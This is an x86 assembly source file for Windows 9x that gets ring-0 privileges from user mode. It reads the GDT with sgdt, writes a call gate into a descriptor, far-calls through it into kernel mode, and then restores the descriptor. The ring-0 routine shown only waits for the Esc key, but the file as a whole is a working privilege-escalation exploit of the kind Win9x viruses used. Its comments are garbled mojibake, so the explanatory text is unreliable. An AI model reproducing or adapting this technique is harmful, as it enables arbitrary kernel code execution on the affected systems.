; ������� � ������� ������ ��� Win9x 
; �����: GDT (Global Descriptor Table, ������� ���������� ������������)

.586p
.model flat

callW           macro   x
                extern  x:PROC
                call    x
                endm

.data

_Start:
                pusha

                call    __pop1          ; ������ SEH

                mov     esp, [esp+8]
                jmp     __exit

__pop1:         push    dword ptr fs:[0]
                mov     fs:[0], esp

                call    __pop2          ; �������� ����� callgate-�

                call    ring0_proc      ; ���������� � ring-0
                retf                    ; ����� RETF -- ������� � ring3

__pop2:         pop     ESI             ; ESI=����� callgate-�

                push    EDI             ; �������� ����� 1-�� �����������
                sgdt    [esp-2]         ; GDT (������� �� ������������)
                pop     EDI
                add     EDI, 8

                fild    qword ptr [EDI] ; ��������� ����������

                mov     EAX, ESI        ; ������� ���������� callgate-�
                cld
                stosw
                mov     EAX, 1110110000000000b shl 16 + 28h
                stosd
                shld    EAX, ESI, 16
                stosw

                db      9Ah             ; ����� callgate-�
                dd      0
                dw      1*8+11b         ; sel.#8, GDT, ring-3

                fistp   qword ptr [EDI-8] ; ������������ ����������

__exit:         pop     dword ptr fs:[0] ; SEH
                pop     EAX

                popa
                ret

; ��� � ������� ������!
ring0_proc:                                ; r0 start
                push    ss ss
                pop     ds es

                pushad

; ���� ������� Esc
WaitESC:                                   
                in        AL, 60h
                cmp       AL, 1
                jne       WaitESC

                popad
                retn                       ; r0 end
.code

start:
                call        _Start
exit:
                push        00000000h
                callW       ExitProcess
end start